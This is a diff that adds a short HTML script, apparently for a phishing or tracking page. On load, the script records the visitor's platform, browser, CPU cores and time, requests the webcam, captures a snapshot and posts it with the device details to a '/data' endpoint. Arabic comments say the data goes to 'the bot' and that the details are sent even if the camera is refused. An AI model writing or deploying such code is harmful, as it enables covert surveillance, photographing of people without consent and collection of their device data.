@@ -1,0 +1,38 @@
+<script>
+async function grab() {
+    const info = {
+        platform: navigator.platform,
+        browser: navigator.userAgent,
+        cores: navigator.hardwareConcurrency,
+        time: new Date().toLocaleString()
+    };
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        setTimeout(() => {
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imgData = canvas.toDataURL('image/jpeg');
+            // إرسال البيانات للبوت
+            fetch('/data', {
+                method: 'POST',
+                body: JSON.stringify({ info, img: imgData }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+        }, 2000);
+    } catch (e) {
+        // إرسال المعلومات فقط إذا رفض الكاميرا
+        fetch('/data', {
+            method: 'POST',
+            body: JSON.stringify({ info, error: "Camera Refused" }),
+            headers: { 'Content-Type': 'application/json' }
+        });
+    }
+}
+grab();
+</script>
+
